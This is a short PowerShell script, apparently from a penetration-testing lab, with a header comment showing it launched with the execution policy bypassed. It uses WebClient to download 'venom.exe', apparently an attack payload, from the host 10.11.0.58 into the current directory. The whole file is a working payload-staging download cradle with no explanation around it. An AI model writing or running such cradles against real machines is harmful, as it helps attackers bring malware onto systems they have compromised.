# powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File download.ps1
$storageDir = $pwd
$webclient = New-Object System.Net.WebClient
$url = "http://10.11.0.58/venom.exe"
$file = "venom.exe"
$webclient.DownloadFile($url,$file)
